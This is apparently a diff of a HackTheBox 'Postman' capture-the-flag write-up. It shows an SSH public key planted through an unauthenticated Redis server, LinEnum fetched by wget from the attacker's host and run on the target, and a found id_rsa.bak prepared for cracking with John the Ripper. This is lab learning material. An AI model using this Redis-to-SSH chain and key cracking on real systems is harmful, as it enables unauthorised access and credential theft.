@@ -43,26 +43,62 @@ I used the ssh-crackit technique in the article below to manually create ssh key
 
 https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
 
+Generate ssh key:
 ```
-shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ redis-cli -h 10.10.10.160
+shotop@kali:~$ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/shotop/.ssh/id_rsa): 
+/home/shotop/.ssh/id_rsa already exists.
+Overwrite (y/n)? y
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/shotop/.ssh/id_rsa.
+Your public key has been saved in /home/shotop/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:brHPGljkGVkGueGBnZI+Nbws63kioDK0EOvgVEyCIuQ shotop@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|o.     =.+o      |
+|=. .  + X+       |
+|oE+  . =+*       |
+|.  o  +o=o       |
+| o.    +S        |
+|+o.   .+ o       |
+|B... ...=        |
+|++  . +..+       |
+|..   . o..o      |
++----[SHA256]-----+
+```
+Prep key to be sent to server:
+```
+shotop@kali:~$ cd /home/shotop/.ssh/
+shotop@kali:~/.ssh$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > shotop.txt
+shotop@kali:~/.ssh$ cat shotop.txt 
+
+
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvn9o2oucCDL+Lna5GP/zoQjzgbA8942jEKZ5qkTnTgO1j/8vu+xlK31/Cf2cochBvqhc3dCGjk5qKjLNUCoMVd1uro/2073Y35n8xTFEYc8XMxfj66t2zdK/MJnzeAGeRRc8O/EU1hFOS7E535PWM5PDohJQxH19OhRcyJE707VjFWkgJtlOtEa/rtUWHzmhie5gcq+KYaATQr0JR+meaQptpJF0PXYsoWqxgNaGlJI7U3Ji/9Ol/VRpLJiVQYextAESu5HJ6h9kSsjywVsC52X9CtXxk/10RXUayojlvZiB00lNx4Obw7T9yObFzRCP7TbA+XaGvetohZKgGrOvidjgdS5gI8azpzYkXEJLGKiXxguJGVynnZXFkyO60GzMyDUapKLQ6kQmky+ji5/HlOQQ99UqFksvimfGV9OmlaSicHKEhisK2tpIK/hzG8QePEolIl9nnM2IgnUTxBgX9YI9PxeJNiz+R/G9H1qoPDA2cs/XXu6iizzcFqjoUrgs= shotop@kali
+```
+
+```
+shotop@kali:~/.ssh$ cat shotop.txt | redis-cli -h 10.10.10.160 -x set crackit
+OK
+shotop@kali:~/.ssh$ redis-cli -h 10.10.10.160
+10.10.10.160:6379> config set dir /home/redis/.ssh/
+(error) ERR Changing directory: Permission denied
 10.10.10.160:6379> config get dir
 1) "dir"
 2) "/var/lib/redis/.ssh"
-10.10.10.160:6379> config get dbfilename
-1) "dbfilename"
-2) "authorized_keys"
+10.10.10.160:6379> redis-cli -h 10.10.10.160 flushall
+(error) ERR unknown command 'redis-cli'
 10.10.10.160:6379> 
-shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ redis-cli -h 10.10.10.160 flushall
+shotop@kali:~/.ssh$ redis-cli -h 10.10.10.160 flushall
 OK
-shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ cat foo.txt | redis-cli -h postman.htb -x set crackit
-Could not connect to Redis at postman.htb:6379: Name or service not known
-shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
+shotop@kali:~/.ssh$ cat shotop.txt | redis-cli -h 10.10.10.160 -x set crackit
 OK
-shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ redis-cli -h 10.10.10.160 save
+shotop@kali:~/.ssh$ redis-cli -h 10.10.10.160 save
 OK
-shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ ssh -i ~/.ssh/id_rsa redis@postman.htb
-ssh: Could not resolve hostname postman.htb: Name or service not known
-shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ ssh -i ~/.ssh/id_rsa redis@10.10.10.160
+shotop@kali:~/.ssh$  ssh -i ~/.ssh/id_rsa redis@10.10.10.160
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -73,8 +109,9 @@ Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
  * Canonical Livepatch is available for installation.
    - Reduce system reboots and improve kernel security. Activate at:
      https://ubuntu.com/livepatch
-Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
-redis@Postman:~$ ^C
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Mon Mar 16 06:19:13 2020 from 10.10.14.41
 redis@Postman:~$ 
 
 ```
@@ -104,10 +141,44 @@ Serving HTTP on 0.0.0.0 port 2222 ...
 On host:
 
 ```
+redis@Postman:~$ cd /tmp/
+redis@Postman:/tmp$ ls
+systemd-private-664d7fa2cc444002b3bb7dbbb5467be3-apache2.service-I4KI09
+systemd-private-664d7fa2cc444002b3bb7dbbb5467be3-redis-server.service-4ce2WU
+systemd-private-664d7fa2cc444002b3bb7dbbb5467be3-systemd-resolved.service-8Ji5q8
+systemd-private-664d7fa2cc444002b3bb7dbbb5467be3-systemd-timesyncd.service-Ou0ZyZ
+redis@Postman:/tmp$ wget 10.10.14.41:3333/LinEnum.sh
+--2020-03-16 18:03:06--  http://10.10.14.41:3333/LinEnum.sh
+Connecting to 10.10.14.41:3333... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [text/x-sh]
+Saving to: ‘LinEnum.sh’
 
+LinEnum.sh                              100%[==============================================================================>]  45.54K  --.-KB/s    in 0.08s   
+
+2020-03-16 18:03:06 (575 KB/s) - ‘LinEnum.sh’ saved [46631/46631]
+
+redis@Postman:/tmp$ ls
+LinEnum.sh
 ```
 
-## searching for .bak files
+Run LinEnum:
+```
+redis@Postman:/tmp$ chmod +x LinEnum.sh
+redis@Postman:/tmp$ ./LinEnum.sh 
+```
+
+There's some interesting information in the output, in particular the location of user Matt's id_rsa backup file:
+```
+[-] Location and Permissions (if accessible) of .bak file(s):
+-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
+-rw------- 1 root root 709 Oct 25 16:38 /var/backups/group.bak
+-rw------- 1 root shadow 588 Oct 25 16:38 /var/backups/gshadow.bak
+-rw------- 1 root shadow 935 Aug 26  2019 /var/backups/shadow.bak
+-rw------- 1 root root 1382 Aug 25  2019 /var/backups/passwd.bak
+```
+
+## viewing Matt's id_rsa.bak file
 ```
 redis@Postman:/$ find / -type f -iname "*.bak" 2>/dev/null
 ```
@@ -146,7 +217,7 @@ X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
 -----END RSA PRIVATE KEY-----
 ```
 
-Other users are Matt - so I assume this is his backup.  Will try to crack with John the ripper:
+Will now try to crack with John the ripper - need to use ssh2john to prep the key for usage with John:
 ```
 python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
 ```
